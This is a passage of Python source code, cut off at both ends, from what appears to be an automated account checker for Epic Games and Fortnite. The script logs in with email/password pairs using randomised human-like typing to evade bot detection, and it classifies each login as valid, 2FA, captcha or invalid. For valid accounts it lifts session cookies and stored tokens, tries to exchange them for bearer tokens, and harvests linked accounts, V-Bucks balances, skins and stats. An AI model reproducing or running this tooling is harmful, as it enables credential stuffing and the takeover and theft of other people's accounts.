            print(f"⚠️ {email} - No interactive challenge elements found")
            return False
            
        except Exception as e:
            print(f"❌ {email} - Error in challenge handler: {e}")
            return False
    
    async def setup_page_blocking(self, page: Page):
        """Setup resource blocking for performance"""
        async def route_handler(route):
            if route.request.resource_type in BLOCK_RESOURCE_TYPES:
                await route.abort()
            else:
                await route.continue_()
        
        await page.route("**/*", route_handler)
    
    async def wait_for_any_selector(self, page: Page, selectors: List[str], timeout: int = 5000) -> Optional[str]:
        """Wait for any of the given selectors to appear"""
        try:
            for selector in selectors:
                try:
                    await page.wait_for_selector(selector, timeout=timeout)
                    return selector
                except:
                    continue
            return None
        except:
            return None
    
    async def fill_if_present(self, page: Page, selectors: List[str], value: str) -> bool:
        """Fill input if any of the selectors is present with human-like typing"""
        for selector in selectors:
            try:
                element = page.locator(selector).first
                if await element.is_visible(timeout=2000):
                    # Clear field first
                    await element.clear()
                    await asyncio.sleep(random.uniform(0.3, 0.8))
                    
                    # Type with human-like delays between characters
                    await element.type(value, delay=random.randint(50, 150))
                    await asyncio.sleep(random.uniform(0.2, 0.5))
                    return True
            except:
                continue
        return False
    
    async def click_if_present(self, page: Page, selectors: List[str]) -> bool:
        """Click element if any of the selectors is present with human-like behavior"""
        for selector in selectors:
            try:
                element = page.locator(selector).first
                if await element.is_visible(timeout=2000):
                    # Hover before clicking (human-like behavior)
                    await element.hover()
                    await asyncio.sleep(random.uniform(0.2, 0.6))
                    
                    # Click with slight delay
                    await element.click(delay=random.randint(50, 200))
                    await asyncio.sleep(random.uniform(0.3, 0.8))
                    return True
            except:
                continue
        return False
    
    async def detect_outcome_and_extract_auth(self, page: Page, email: str) -> Tuple[AccountStatus, Dict[str, Any]]:
        """Detect login outcome and extract auth code if successful"""
        try:
            # Wait for page to stabilize
            await asyncio.sleep(3)
            
            current_url = page.url
            page_content = await page.content()
            
            print(f"🔍 {email} - Analyzing page: {current_url}")
            
            # Success detection - Epic Games redirects to account page or shows account info
            success_urls = [
                "/account",
                "account.epicgames.com",
                "/id/account",
                "epicgames.com/account"
            ]
            
            if any(url in current_url for url in success_urls):
                print(f"✅ {email} - Success detected by URL: {current_url}")
                auth_code = await self.extract_auth_code(page, email)
                
                # Fetch detailed account information using auth code
                account_details = await self.fetch_account_details(auth_code, page, email)
                
                return AccountStatus.VALID, {
                    'message': 'Login successful',
                    'auth_code': auth_code,
                    'account_url': current_url,
                    **account_details
                }
            
            # Check for account-related elements and text
            success_indicators = [
                "Sign Out",
                "Account Settings",
                "Profile",
                "My Account",
                "Epic Games Account",
                "Account Overview"
            ]
            
            page_text = page_content.lower()
            for indicator in success_indicators:
                if indicator.lower() in page_text:
                    print(f"✅ {email} - Success detected by content: {indicator}")
                    auth_code = await self.extract_auth_code(page, email)
                    
                    # Fetch detailed account information using auth code
                    account_details = await self.fetch_account_details(auth_code, page, email)
                    
                    return AccountStatus.VALID, {
                        'message': f'Login successful - {indicator} found',
                        'auth_code': auth_code,
                        'account_url': current_url,
                        **account_details
                    }
            
            # 2FA detection
            twofa_indicators = [
                "two-factor",
                "security code",
                "verification code",
                "authenticator",
                "email code",
                "enter the code",
                "authentication code"
            ]
            
            for indicator in twofa_indicators:
                if indicator in page_text:
                    print(f"🔐 {email} - 2FA detected: {indicator}")
                    return AccountStatus.TWO_FA, {
                        'message': f'2FA required - {indicator}',
                        'error': '2FA authentication needed'
                    }
            
            # Captcha detection (including Cloudflare challenges)
            try:
                # Check for various captcha types
                captcha_checks = [
                    ("iframe[src*='hcaptcha.com']", "hCaptcha"),
                    ("iframe[src*='arkoselabs']", "Arkose Labs"),
                    ("iframe[src*='recaptcha']", "reCAPTCHA"),
                    ("[class*='captcha' i]", "Generic captcha"),
                    ("input[name='cf-turnstile-response']", "Cloudflare Turnstile"),
                    (".cf-challenge", "Cloudflare challenge")
                ]
                
                for selector, captcha_type in captcha_checks:
                    count = await page.locator(selector).count()
                    if count > 0:
                        print(f"🤖 {email} - Captcha detected: {captcha_type}")
                        return AccountStatus.CAPTCHA, {
                            'message': f'{captcha_type} required',
                            'error': f'Captcha challenge: {captcha_type}'
                        }
            except:
                pass
            
            # Invalid credentials detection
            invalid_indicators = [
                "invalid credentials",
                "incorrect password",
                "wrong password",
                "authentication failed",
                "login failed",
                "invalid email",
                "account not found",
                "password is incorrect"
            ]
            
            for indicator in invalid_indicators:
                if indicator in page_text:
                    print(f"❌ {email} - Invalid credentials detected: {indicator}")
                    return AccountStatus.INVALID, {
                        'message': f'Invalid credentials - {indicator}',
                        'error': 'Invalid email or password'
                    }
            
            # Check for error elements
            try:
                error_selectors = [
                    "[role='alert']",
                    ".error",
                    ".alert-danger",
                    "[class*='error' i]",
                    "[data-testid*='error' i]",
                    ".MuiAlert-message"
                ]
                
                for selector in error_selectors:
                    error_elements = await page.locator(selector).count()
                    if error_elements > 0:
                        error_text = await page.locator(selector).first.text_content()
                        if error_text:
                            error_lower = error_text.lower()
                            if any(word in error_lower for word in ["credential", "invalid", "incorrect", "password", "email"]):
                                print(f"❌ {email} - Error element detected: {error_text[:100]}")
                                return AccountStatus.INVALID, {
                                    'message': f'Login error: {error_text[:100]}',
                                    'error': error_text[:200]
                                }
            except:
                pass
            
            # Check if still on login page (login failed)
            if "/login" in current_url or "login" in page_text:
                print(f"❌ {email} - Still on login page, likely invalid credentials")
                return AccountStatus.INVALID, {
                    'message': 'Login failed - still on login page',
                    'error': 'Credentials appear to be invalid'
                }
            
            # Default to error if we can't determine the outcome
            print(f"⚠️ {email} - Unable to determine outcome, URL: {current_url}")
            return AccountStatus.ERROR, {
                'message': 'Unable to determine login outcome',
                'error': f'Unexpected page state: {current_url}'
            }
            
        except Exception as e:
            print(f"❌ {email} - Error in outcome detection: {str(e)}")
            return AccountStatus.ERROR, {
                'message': f'Detection error: {str(e)}',
                'error': str(e)
            }
    
    async def extract_auth_code(self, page: Page, email: str) -> Optional[str]:
        """Extract authentication code/token for further Epic Games API calls"""
        try:
            print(f"🔑 {email} - Attempting to extract auth code...")
            
            # Try to extract from cookies
            cookies = await page.context.cookies()
            for cookie in cookies:
                # Look for Epic Games auth tokens
                if cookie['name'] in ['EPIC_BEARER_TOKEN', 'EPIC_SESSION_AP', 'EPIC_SESSION', 'epic_session']:
                    print(f"🔑 {email} - Found auth token in cookies: {cookie['name']}")
                    return cookie['value']
            
            # Try to extract from localStorage
            try:
                local_storage = await page.evaluate("""
                    () => {
                        const storage = {};
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            if (key && (key.includes('epic') || key.includes('auth') || key.includes('token'))) {
                                storage[key] = localStorage.getItem(key);
                            }
                        }
                        return storage;
                    }
                """)
                
                if local_storage:
                    print(f"🔑 {email} - Found auth data in localStorage: {list(local_storage.keys())}")
                    # Return the first auth-related item
                    for key, value in local_storage.items():
                        if value and len(value) > 10:  # Basic validation
                            return value
            except:
                pass
            
            # Try to extract from page URL or redirects
            current_url = page.url
            if "access_token=" in current_url:
                import re
                token_match = re.search(r'access_token=([^&]+)', current_url)
                if token_match:
                    print(f"🔑 {email} - Found access token in URL")
                    return token_match.group(1)
            
            # Try to wait for and extract from network requests
            try:
                # This is a placeholder for more advanced token extraction
                # In a real implementation, you might intercept network requests
                # to capture auth tokens from API calls
                pass
            except:
                pass
            
            print(f"⚠️ {email} - No auth code found, but login was successful")
            return None
            
        except Exception as e:
            print(f"❌ {email} - Error extracting auth code: {str(e)}")
            return None
    
    async def fetch_account_details(self, auth_code: Optional[str], page: Page, email: str) -> Dict[str, Any]:
        """
        Minimal account information extraction via Epic verify and Fortnite accountInfo
        Returns only fields from those web APIs
        """
        account_info = {
            'email': email,
            'status': 'valid',
            'extraction_method': 'web_epic_fortnite_api',
            'timestamp': datetime.now().isoformat(),
            'account_data': {}
        }
        
        try:
            # Minimal data extraction per request: use Epic verify and Fortnite accountInfo only
            # 1) Save sessionStorage snapshot (for persistence indication)
            try:
                storage_snapshot = await page.evaluate(
                    "() => { const s = {}; for (let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i); s[k]=sessionStorage.getItem(k);} return s; }"
                )
                account_info['session_storage_saved'] = True if isinstance(storage_snapshot, dict) else False
            except Exception:
                account_info['session_storage_saved'] = False

            # 2) Verify Epic account to get id and displayName
            if 'epicgames.com' not in page.url:
                try:
                    await page.goto('https://www.epicgames.com/id/login', wait_until='domcontentloaded')
                except Exception:
                    pass
            try:
                verify_resp = await page.evaluate(
                    """
                    async () => {
                        try {
                            const res = await fetch('https://www.epicgames.com/id/api/account/verify', {
                                method: 'POST',
                                credentials: 'include',
                                headers: { 'Content-Type': 'application/json' }
                            });
                            const text = await res.text();
                            let data = null; try { data = JSON.parse(text); } catch(e) {}
                            return { ok: res.ok, status: res.status, data, raw: text };
                        } catch (e) {
                            return { ok: false, status: 0, error: String(e) };
                        }
                    }
                    """
                )
            except Exception as e:
                verify_resp = { 'ok': False, 'status': 0, 'error': str(e) }

            if not verify_resp.get('ok') or not isinstance(verify_resp.get('data'), dict):
                raise RuntimeError(f"Verify API failed: {verify_resp.get('status')} - {verify_resp.get('error') or verify_resp.get('raw', '')[:120]}")

            epic_data = verify_resp['data']
            account_info['account_data'].update({
                'account_id': epic_data.get('id'),
                'display_name': epic_data.get('displayName') or epic_data.get('displayname'),
                'email_verified': epic_data.get('emailVerified', None)
            })

            # 3) Fortnite account info via locale API
            try:
                nav_lang = await page.evaluate("() => (navigator.language || 'en-US')")
            except Exception:
                nav_lang = 'en-US'

            candidate_locales = []
            if isinstance(nav_lang, str) and len(nav_lang) >= 2:
                if '-' in nav_lang:
                    parts = nav_lang.split('-')
                    candidate_locales.append(f"{parts[0].lower()}-{parts[1].upper()}")
                else:
                    candidate_locales.append(nav_lang.lower())
            candidate_locales += ['en-US', 'en']

            fortnite_info = None
            for loc in candidate_locales:
                try:
                    url = f"https://www.fortnite.com/{loc}/api/accountInfo"
                    resp = await page.evaluate(
                        """
                        async (url) => {
                            try {
                                const res = await fetch(url, { credentials: 'include' });
                                const text = await res.text();
                                let data = null; try { data = JSON.parse(text); } catch(e) {}
                                return { ok: res.ok, status: res.status, data, raw: text };
                            } catch (e) {
                                return { ok: false, status: 0, error: String(e) };
                            }
                        }
                        """,
                        url
                    )
                    if resp and resp.get('ok') and isinstance(resp.get('data'), dict):
                        fortnite_info = resp['data']
                        fortnite_info['_used_locale'] = loc
                        break
                except Exception:
                    continue

            if not fortnite_info:
                try:
                    await page.goto('https://www.fortnite.com/en-US', wait_until='domcontentloaded')
                    resp2 = await page.evaluate(
                        """
                        async () => {
                            try {
                                const res = await fetch('/en-US/api/accountInfo', { credentials: 'include' });
                                const text = await res.text();
                                let data = null; try { data = JSON.parse(text); } catch(e) {}
                                return { ok: res.ok, status: res.status, data, raw: text };
                            } catch (e) {
                                return { ok: false, status: 0, error: String(e) };
                            }
                        }
                        """
                    )
                    if resp2 and resp2.get('ok') and isinstance(resp2.get('data'), dict):
                        fortnite_info = resp2['data']
                        fortnite_info['_used_locale'] = 'en-US'
                except Exception:
                    pass

            if isinstance(fortnite_info, dict):
                acct = fortnite_info.get('accountInfo') or {}
                account_info['account_data'].update({
                    'is_logged_in': fortnite_info.get('isLoggedIn', acct.get('isLoggedIn')),
                    'fortnite_account_id': acct.get('id'),
                    'fortnite_display_name': acct.get('displayName'),
                    'fortnite_email': acct.get('email'),
                    'country': acct.get('country'),
                    'lang': acct.get('lang'),
                    'cabined_mode': acct.get('cabinedMode')
                })

            return account_info

            # Method 1: Try API-based approach with auth code
            if auth_code:
                print(f"🔍 {email} - Fetching account details using auth token...")
                api_details = await self._fetch_via_api(auth_code, email)
                if api_details.get('success'):
                    account_info['extraction_method'] = 'api_token'
                    account_info['account_data'] = api_details['data']
                    print(f"✅ {email} - Comprehensive account data extracted via API")
                    return account_info
            
            # Method 2: Cookie-based extraction
            print(f"🍪 {email} - Attempting cookie-based account extraction...")
            cookie_details = await self._fetch_via_cookies(page, email)
            if cookie_details.get('success'):
                account_info['extraction_method'] = 'cookies'
                account_info['account_data'] = cookie_details['data']
                print(f"✅ {email} - Account data extracted via cookies")
                return account_info
            
            # Method 3: Browser-based extraction (scraping account pages)
            print(f"🌐 {email} - Attempting browser-based account extraction...")
            browser_details = await self._fetch_via_browser(page, email)
            if browser_details.get('success'):
                account_info['extraction_method'] = 'browser_scraping'
                account_info['account_data'] = browser_details['data']
                print(f"✅ {email} - Account data extracted via browser scraping")
                return account_info
            
            # If all methods fail, return basic valid account info
            print(f"⚠️ {email} - All extraction methods failed, returning basic account info")
            account_info['extraction_method'] = 'basic'
            account_info['account_data'] = {
                'message': 'Login successful but detailed info unavailable',
                'login_verified': True
            }
            return account_info
            
        except Exception as e:
            print(f"❌ {email} - Error during account details extraction: {str(e)}")
            account_info['status'] = 'error'
            account_info['account_data'] = {'error': str(e)}
            return account_info
    
    async def _exchange_session_for_bearer(self, session_token: str, email: str) -> Optional[str]:
        """Exchange Epic Games session cookie for Bearer token"""
        try:
            # Epic Games OAuth token endpoint
            token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
            
            # Prepare headers for token exchange
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': self.get_next_user_agent(),
                'Cookie': f'EPIC_SESSION_AP={session_token}'
            }
            
            # Token exchange payload
            data = {
                'grant_type': 'exchange_code',
                'exchange_code': session_token,
                'token_type': 'eg1'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(token_url, headers=headers, data=data) as response:
                    if response.status == 200:
                        token_data = await response.json()
                        bearer_token = token_data.get('access_token')
                        if bearer_token:
                            print(f"✅ {email} - Successfully exchanged session for Bearer token")
                            return bearer_token
                    else:
                        print(f"⚠️ {email} - Token exchange failed: {response.status}")
                        # Try alternative method - use session cookie directly for some endpoints
                        return session_token
            
            return None
            
        except Exception as e:
            print(f"❌ {email} - Error exchanging session for Bearer token: {e}")
            # Fallback: return session token as-is
            return session_token
    
    async def _fetch_via_api(self, auth_code: str, email: str) -> Dict[str, Any]:
        """Extract account details using Epic Games API with auth token"""
        try:
            # First, try to exchange session cookie for Bearer token
            bearer_token = await self._exchange_session_for_bearer(auth_code, email)
            if not bearer_token:
                print(f"❌ {email} - Failed to get Bearer token from session")
                return {'success': False, 'error': 'No Bearer token'}
            
            # Prepare headers with Bearer token
            headers = {
                'Authorization': f'Bearer {bearer_token}',
                'User-Agent': self.get_next_user_agent(),
                'Content-Type': 'application/json'
            }
            
            account_data = {}
            
            # Get basic account info
            async with aiohttp.ClientSession() as session:
                # Account profile endpoint
                async with session.get(
                    'https://account-public-service-prod.ol.epicgames.com/account/api/public/account',
                    headers=headers
                ) as response:
                    if response.status == 200:
                        profile_data = await response.json()
                        account_data.update({
                            'account_id': profile_data.get('id'),
                            'display_name': profile_data.get('displayName'),
                            'email_verified': profile_data.get('emailVerified'),
                            'minor_verified': profile_data.get('minorVerified'),
                            'minor_expected': profile_data.get('minorExpected'),
                            'cabined': profile_data.get('cabined'),
                            'has_hashed_email': profile_data.get('hasHashedEmail')
                        })
                    else:
                        print(f"❌ {email} - Account API failed: {response.status}")
                        return {'success': False, 'error': f'Account API failed: {response.status}'}
                
                # External auths (linked accounts)
                async with session.get(
                    f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_data.get("account_id", "")}/externalAuths',
                    headers=headers
                ) as response:
                    if response.status == 200:
                        external_auths = await response.json()
                        account_data['linked_accounts'] = external_auths
                
                # Try to get Fortnite profile data (cosmetics, stats, etc.)
                if account_data.get('account_id'):
                    try:
                        # Get Athena profile (Battle Royale cosmetics and stats)
                        athena_profile = await self._get_fortnite_profile(session, headers, account_data['account_id'], 'athena')
                        if athena_profile:
                            cosmetics_data = self._parse_athena_profile(athena_profile)
                            account_data.update(cosmetics_data)
                        
                        # Get Common Core profile (account level, V-Bucks, etc.)
                        common_core = await self._get_fortnite_profile(session, headers, account_data['account_id'], 'common_core')
                        if common_core:
                            core_data = self._parse_common_core_profile(common_core)
                            account_data.update(core_data)
                            
                        # Try to get basic stats
                        try:
                            async with session.get(
                                f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/stats/accountId/{account_data["account_id"]}/bulk/window/alltime',
                                headers=headers
                            ) as response:
                                if response.status == 200:
                                    stats_data = await response.json()
                                    account_data['fortnite_stats'] = stats_data
                        except:
                            pass
                    except Exception as profile_error:
                        print(f"⚠️ {email} - Error fetching Fortnite profile: {profile_error}")
                        pass
            
            if account_data:
                return {'success': True, 'data': account_data}
            else:
                return {'success': False, 'error': 'No account data retrieved'}
                
        except Exception as e:
            return {'success': False, 'error': f'API extraction failed: {str(e)}'}
    
    async def _get_fortnite_profile(self, session: aiohttp.ClientSession, headers: Dict[str, str], account_id: str, profile_id: str) -> Optional[Dict[str, Any]]:
        """Get specific Fortnite profile data"""
        try:
            # Try multiple profile endpoints
            endpoints = [
                f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/{profile_id}?profileId={profile_id}",
                f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/{profile_id}"
            ]
            
            for endpoint in endpoints:
                try:
                    # Use POST request as Epic Games API often requires it
                    payload = {
                        "profileId": profile_id,
                        "rvn": -1
                    }
                    
                    async with session.post(endpoint, headers=headers, json=payload) as response:
                        if response.status == 200:
                            return await response.json()
                        elif response.status == 404:
                            # Profile not found, try next endpoint
                            continue
                except:
                    continue
            
            return None
            
        except Exception as e:
            print(f"Error getting {profile_id} profile: {e}")
            return None
    
    def _parse_athena_profile(self, profile_data: Dict[str, Any]) -> Dict[str, Any]:
        """Parse Athena profile for cosmetics and Battle Royale stats"""
        try:
            result = {}
            
            # Get profile stats
            profile_stats = profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('stats', {}).get('attributes', {})
            
            # Battle Pass info
            result['battle_pass_level'] = profile_stats.get('book_level', 0)
            result['battle_pass_purchased'] = profile_stats.get('book_purchased', False)
            result['seasonal_level'] = profile_stats.get('season_match_boost', 0)
            result['account_level'] = profile_stats.get('accountLevel', 0)
            
            # Lifetime stats
            result['lifetime_wins'] = profile_stats.get('lifetime_wins', 0)
            
            # Get items (cosmetics)
            items = profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
            
            if items:
                # Parse cosmetics using the cosmetic parser
                outfits = self.cosmetic_parser.get_outfits(items)
                back_blings = self.cosmetic_parser.get_back_blings(items)
                gliders = self.cosmetic_parser.get_gliders(items)
                pickaxes = self.cosmetic_parser.get_pickaxes(items)
                
                # Only add non-empty cosmetic lists
                if outfits:
                    result['skins'] = outfits.split('\n') if '\n' in outfits else [outfits]
                if back_blings:
                    result['back_blings'] = back_blings.split('\n') if '\n' in back_blings else [back_blings]
                if gliders:
                    result['gliders'] = gliders.split('\n') if '\n' in gliders else [gliders]
                if pickaxes:
                    result['pickaxes'] = pickaxes.split('\n') if '\n' in pickaxes else [pickaxes]
                
                # Count cosmetics
                result['total_skins'] = len(result.get('skins', []))
                result['total_back_blings'] = len(result.get('back_blings', []))
                result['total_gliders'] = len(result.get('gliders', []))
                result['total_pickaxes'] = len(result.get('pickaxes', []))
                result['total_cosmetics'] = result['total_skins'] + result['total_back_blings'] + result['total_gliders'] + result['total_pickaxes']
            
            return result
            
        except Exception as e:
            print(f"Error parsing Athena profile: {e}")
            return {'profile_parse_error': str(e)}
    
    def _parse_common_core_profile(self, profile_data: Dict[str, Any]) -> Dict[str, Any]:
        """Parse Common Core profile for account level, V-Bucks, etc."""
        try:
            result = {}
            
            # Get profile stats
            profile_stats = profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('stats', {}).get('attributes', {})
            
            # Account level and XP
            result['account_level'] = profile_stats.get('level', 0)
            result['account_xp'] = profile_stats.get('xp', 0)
            
            # V-Bucks and other currencies
            items = profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
            
            for item_id, item_data in items.items():
                template_id = item_data.get('templateId', '')
                quantity = item_data.get('quantity', 0)
                
                if 'Currency:MtxPurchased' in template_id:
                    result['vbucks_purchased'] = quantity
                elif 'Currency:MtxComplimentary' in template_id:
                    result['vbucks_earned'] = quantity
                elif 'Currency:MtxGiveaway' in template_id:
                    result['vbucks_giveaway'] = quantity
            
            # Calculate total V-Bucks
            total_vbucks = result.get('vbucks_purchased', 0) + result.get('vbucks_earned', 0) + result.get('vbucks_giveaway', 0)
            if total_vbucks > 0:
                result['total_vbucks'] = total_vbucks
            
            return result
            
        except Exception as e:
            print(f"Error parsing Common Core profile: {e}")
            return {'core_parse_error': str(e)}
    
    async def _fetch_via_cookies(self, page: Page, email: str) -> Dict[str, Any]:
        """Extract account details using browser session cookies with Fortnite API calls"""
        try:
            # Get all cookies from the browser
            cookies = await page.context.cookies()
            cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
            
            # Look for Epic session cookies
            epic_session = cookie_dict.get('EPIC_SESSION_AP') or cookie_dict.get('EPIC_BEARER_TOKEN')
            if not epic_session:
                return {'success': False, 'error': 'No Epic session cookies found'}
            
            # Prepare cookie string for API requests
            cookie_string = '; '.join([f"{name}={value}" for name, value in cookie_dict.items() if 'EPIC' in name.upper()])
            
            account_data = {}
            
            # Use the browser's session to make API calls
            try:
                # Method 1: Try to get account info via JavaScript API calls in the browser
                account_info = await page.evaluate("""
                    async () => {
                        try {
                            // Try to find account info in window objects
                            if (window.EpicGames && window.EpicGames.user) {
                                return {
                                    success: true,
                                    data: {
                                        account_id: window.EpicGames.user.id,
                                        display_name: window.EpicGames.user.displayName,
                                        email: window.EpicGames.user.email
                                    }
                                };
                            }
                            
                            // Try to make API call using fetch
                            const response = await fetch('/account/api/public/account', {
                                credentials: 'include',
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            
                            if (response.ok) {
                                const data = await response.json();
                                return {
                                    success: true,
                                    data: {
                                        account_id: data.id,
                                        display_name: data.displayName,
                                        email_verified: data.emailVerified,
                                        cabined: data.cabined
                                    }
                                };
                            }
                            
                            return { success: false, error: 'No account data found' };
                        } catch (error) {
                            return { success: false, error: error.message };
                        }
                    }
                """)
                
                if account_info.get('success'):
                    account_data.update(account_info['data'])
                
            except Exception as js_error:
                print(f"⚠️ {email} - JavaScript API extraction failed: {js_error}")
            
            # Method 2: Navigate to account pages to extract information
            try:
                # Try to get account info from Epic account page
                await page.goto('https://www.epicgames.com/account/personal', wait_until='networkidle')
                await asyncio.sleep(3)
                
                # Extract display name
                try:
                    display_name_selectors = [
                        '[data-testid="display-name"]',
                        '.display-name',
                        '[data-component="display-name"]',
                        'input[name="displayName"]',
                        'h1, h2, h3'  # Fallback to headers
                    ]
                    
                    for selector in display_name_selectors:
                        try:
                            element = page.locator(selector).first
                            if await element.is_visible(timeout=2000):
                                display_name = await element.text_content()
                                if display_name and display_name.strip():
                                    account_data['display_name'] = display_name.strip()
                                    break
                        except:
                            continue
                except:
                    pass
                
                # Try to get account ID from page source
                try:
                    page_content = await page.content()
                    import re
                    
                    # Look for various account ID patterns
                    patterns = [
                        r'"accountId":"([a-f0-9-]+)"',
                        r'"id":"([a-f0-9-]+)"',
                        r'accountId["\']:\s*["\']([a-f0-9-]+)["\']',
                        r'user["\']:\s*{[^}]*["\']id["\']:\s*["\']([a-f0-9-]+)["\']'
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, page_content)
                        if match:
                            account_data['account_id'] = match.group(1)
                            break
                except:
                    pass
                
                # Try to navigate to Fortnite-specific pages for more data
                try:
                    await page.goto('https://www.epicgames.com/fortnite/en-US/home', wait_until='networkidle')
                    await asyncio.sleep(2)
                    
                    # Look for Fortnite-specific account data
                    page_content = await page.content()
                    if 'fortnite' in page_content.lower():
                        account_data['has_fortnite'] = True
                except:
                    pass
                
            except Exception as nav_error:
                print(f"⚠️ {email} - Navigation error during cookie extraction: {nav_error}")
            
            # Method 3: Try to get account ID from current page if we have it
            if not account_data.get('account_id'):
                try:
                    current_url = page.url
                    if '/account/' in current_url:
                        import re
                        id_match = re.search(r'/account/([a-f0-9-]+)', current_url)
                        if id_match:
                            account_data['account_id'] = id_match.group(1)
                except:
                    pass
            
            if account_data:
                print(f"✅ {email} - Extracted account data via cookies: {list(account_data.keys())}")
                return {'success': True, 'data': account_data}
            else:
                return {'success': False, 'error': 'Could not extract account data from cookies'}
                
        except Exception as e:
            return {'success': False, 'error': f'Cookie extraction failed: {str(e)}'}
    
    async def _fetch_via_browser(self, page: Page, email: str) -> Dict[str, Any]:
        """Extract account details by navigating to account pages and scraping"""
        try:
            account_data = {}
            
            # Try to navigate to Epic Games account dashboard
            try:
                await page.goto('https://www.epicgames.com/account/personal', wait_until='networkidle')
                await asyncio.sleep(3)
                
                # Check if we're still logged in
                current_url = page.url
                if 'login' in current_url:
                    return {'success': False, 'error': 'Session expired, redirected to login'}
                
                # Extract various account information
                try:
                    # Display name
                    display_name_selectors = [
                        '[data-testid="display-name"]',
                        '.display-name',
                        '[data-component="DisplayName"]',
                        'h1:has-text("Display Name")',
                        'input[name="displayName"]'
                    ]
                    
                    for selector in display_name_selectors:
                        try:
                            element = page.locator(selector).first
                            if await element.is_visible():
                                text = await element.text_content() or await element.get_attribute('value')
                                if text and text.strip():
                                    account_data['display_name'] = text.strip()
                                    break
                        except:
                            continue
                
                except Exception as extract_error:
                    print(f"⚠️ {email} - Error extracting display name: {extract_error}")
                
                # Try to get account creation info or other details from page
                try:
                    page_text = await page.text_content('body')
                    if 'Account created' in page_text:
                        import re
                        creation_match = re.search(r'Account created[:\s]+([^\n]+)', page_text)
                        if creation_match:
                            account_data['account_created'] = creation_match.group(1).strip()
                except:
                    pass
                
            except Exception as nav_error:
                print(f"⚠️ {email} - Navigation error during browser extraction: {nav_error}")
            
            # Try to extract Fortnite-specific data
            try:
                print(f"🎮 {email} - Attempting to extract Fortnite account data...")
                fortnite_data = await self._extract_fortnite_data_browser(page, email)
                if fortnite_data:
                    account_data.update(fortnite_data)
                    print(f"✅ {email} - Fortnite data extracted successfully")
            except Exception as fortnite_error:
                print(f"⚠️ {email} - Error extracting Fortnite data: {fortnite_error}")
            
            # Add basic success info even if we couldn't extract much
            if not account_data:
                account_data = {
                    'login_verified': True,
                    'message': 'Login successful, limited account info available'
                }
            
            return {'success': True, 'data': account_data}
            
        except Exception as e:
            return {'success': False, 'error': f'Browser extraction failed: {str(e)}'}
    
    async def _extract_fortnite_data_browser(self, page: Page, email: str) -> Dict[str, Any]:
        """Extract comprehensive Fortnite account data via browser navigation"""
        try:
            fortnite_data = {}
            
            # Method 1: Try to navigate to Fortnite account page
            try:
                print(f"🎮 {email} - Navigating to Fortnite account page...")
                await page.goto('https://www.epicgames.com/fortnite/en-US/home', wait_until='networkidle')
                await asyncio.sleep(5)  # Wait for page to fully load
                
                # Check if we have access to Fortnite
                page_content = await page.content()
                if 'fortnite' in page_content.lower():
                    fortnite_data['has_fortnite'] = True
                    
                    # Try to find account-specific elements
                    try:
                        # Look for Battle Pass info
                        battle_pass_elements = await page.locator('text=/battle pass/i').all()
                        if battle_pass_elements:
                            fortnite_data['battle_pass_detected'] = True
                            
                        # Look for V-Bucks info
                        vbucks_elements = await page.locator('text=/v-bucks/i').all()
                        if vbucks_elements:
                            fortnite_data['vbucks_detected'] = True
                            
                    except:
                        pass
                        
            except Exception as nav_error:
                print(f"⚠️ {email} - Error navigating to Fortnite page: {nav_error}")
            
            # Method 2: Try to access Epic Games Store library
            try:
                print(f"📚 {email} - Checking Epic Games library...")
                await page.goto('https://store.epicgames.com/en-US/library', wait_until='networkidle')
                await asyncio.sleep(5)
                
                # Look for Fortnite in library
                page_text = await page.text_content('body')
                if 'fortnite' in page_text.lower():
                    fortnite_data['fortnite_in_library'] = True
                    
                    # Try to extract game info
                    try:
                        # Look for play time or other game stats
                        if 'hours played' in page_text.lower():
                            import re
                            hours_match = re.search(r'(\d+(?:\.\d+)?)\s*hours?\s*played', page_text, re.IGNORECASE)
                            if hours_match:
                                fortnite_data['hours_played'] = float(hours_match.group(1))
                    except:
                        pass
                        
            except Exception as library_error:
                print(f"⚠️ {email} - Error checking Epic Games library: {library_error}")
            
            # Method 3: Try to access account settings for more detailed info
            try:
                print(f"⚙️ {email} - Checking account settings...")
                await page.goto('https://www.epicgames.com/account/personal', wait_until='networkidle')
                await asyncio.sleep(3)
                
                # Extract account ID from page source
                page_content = await page.content()
                import re
                
                # Look for account ID patterns
                account_id_patterns = [
                    r'"accountId":"([a-f0-9-]+)"',
                    r'"id":"([a-f0-9-]+)"',
                    r'accountId["\']:\s*["\']([a-f0-9-]+)["\']'
                ]
                
                for pattern in account_id_patterns:
                    match = re.search(pattern, page_content)
                    if match:
                        account_id = match.group(1)
                        if len(account_id) > 10:  # Basic validation
                            fortnite_data['account_id'] = account_id
                            print(f"🆔 {email} - Found account ID: {account_id[:8]}...")
                            break
                            
                # Try to make API calls using the browser's session
                if fortnite_data.get('account_id'):
                    try:
                        print(f"🔍 {email} - Attempting to fetch profile data via browser...")
                        profile_data = await self._fetch_profile_via_browser(page, fortnite_data['account_id'], email)
                        if profile_data:
                            fortnite_data.update(profile_data)
                    except Exception as api_error:
                        print(f"⚠️ {email} - Browser API call failed: {api_error}")
                        
            except Exception as settings_error:
                print(f"⚠️ {email} - Error checking account settings: {settings_error}")
            
            # Method 4: Try to extract cosmetics data using the cosmetic parser
            try:
                if fortnite_data.get('account_id'):
                    print(f"💄 {email} - Attempting to extract cosmetics data...")
                    
                    # Navigate to a page that might have cosmetics data
                    await page.goto('https://www.epicgames.com/fortnite/en-US/battle-pass', wait_until='networkidle')
                    await asyncio.sleep(3)
                    
                    # Look for cosmetics in page data
                    page_content = await page.content()
                    
                    # Use regex to find potential cosmetic IDs or names
